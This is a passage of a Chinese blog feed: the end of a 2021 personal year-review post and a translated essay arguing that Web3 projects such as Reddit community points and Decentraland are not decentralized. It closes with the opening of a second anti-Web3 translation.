href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 而被黑客攻击、所有的资金全部化为乌有，以太坊网络被迫硬分叉来保护投资者的合约。当然，相比继续讨论 DAO 的失败案例，我们还是讨论一下这些实践是如何运作的吧。</p>\n<h3>案例分析：Reddit 社区代币</h3>\n<p>让我们把这一切带回我们开始的地方：Web3 的趋势与互联网上的社交媒体巨头。正如我之前所说，Reddit 是最有兴趣加入 DAO 并开始称自己为 「去中心化」的网站，所以我们将从那里开始。</p>\n<p>这里要做的明显比较是，Reddit 是一个类似于 Usenet 的中心化网站。Reddit 承载着 Subreddit，并提供审核工具，既包括 Upvote / Downvote 的形式，也包括实际的版主形式。在 Reddit 上，严格禁止操纵 Upvote / Downvote 的行为，网站管理员使用自动化工具禁止任何人这样做。这为子版块的社区创造了一种决定哪些内容是最好的方式，并将这些优质内容推广到前面，无论他们是一个偶然的潜水者还是一个活跃的成员发表的。这是 Reddit 运作的基础，到目前为止，它运作得相当好。</p>\n<p>随着社区积分的引入，Reddit 声称他们允许会员「拥有他们喜欢的社区的一部分」，就像股东拥有他们喜欢的公司的一部分一样。积分是衡量声誉的一个标准，是用于投票或福利的货币，如徽章、表情符号、GIF 等，以炫耀你的财富。投票是不具约束力的公投，采用一人一票和每点一票的方式计算。在投票过程中，积分不会被消耗。每隔四周，Reddit 网站会公布每个用户的名单，他们获得了多少 Karma，以及他们将获得多少积分作为补偿。对这个名单的修改可以用积分投票的方法提出。</p>\n<p>这里应该很明显的一点是，这根本就不是去中心化。因为你甚至不能在 Reddit 的系统中投票选举新版主。当然，你也不能建立属于你自己的 Subreddit，并在那里建立一个社区；或者从 Reddit 主网络中分叉出来，创建一套新的独立子版块；或者规避 Reddit 网站管理员的意愿；或者逃避 Reddit 是一个需要盈利的企业的事实、而让用户购买假的互联网积分、并让用户产生自己拥有控制的错觉。</p>\n<h3>案例分析：Decentraland</h3>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/decentraland.jpg\" alt=\"decentraland.png\" width=\"1207\" height=\"682\"></p>\n<p>抛开 Reddit，现在让我们请出 <a href=\"https://decentraland.org/\">Decentraland</a>。这是一个用于创建虚拟世界的 DAO，这个概念如今也被称为「元宇宙」。</p>\n<p>Decentraland 允许用户对 Decentraland 生态系统内的各种政策和变量进行投票，例如增加新的可穿戴设备，对某些项目的拨款，市场费用，允许使用的基础设施等。还存在一个安全顾问委员会、有权力扔掉现有的合约、改用修复了漏洞的合约。<a href=\"https://governance.decentraland.org/\">你可以在这里查看这些提案的一些例子</a>。一个特别有趣的是这个拨款提案，<a href=\"https://governance.decentraland.org/proposal/?id=47e1bb80-4139-11ec-be0c-afec86cba5e5\">以增加对一个被称为 IPSME 的元宇宙协议的支持</a>，这是我想改天进一步调查的事情。</p>\n<p>Decentraland 从根本上说是在一个被称为 MANA 的可替换代币上运行的，它被用于所有系统内的交易。虽然投票是使用 <a href=\"https://docs.snapshot.org/\">Snapshot</a> 进行的，没有交易费用（Gas），<a href=\"https://docs.decentraland.org/decentraland/what-do-you-need-to-participate/\">但你的投票权是由你拥有的游戏中的货币数量加权的</a>。这（在理论上）<strong>使已建立的富裕用户比新建立的贫穷账户更重要</strong>，使用的系统非常类似于标准加密货币中的股权证明工作。</p>\n<p>虽然我不能证明 Decentraland 遵循了这一点，但 DAO 中一个常见的投票结构是「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」。这是为了判断一个人的偏好程度，而不是单纯的二元 是 / 否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a 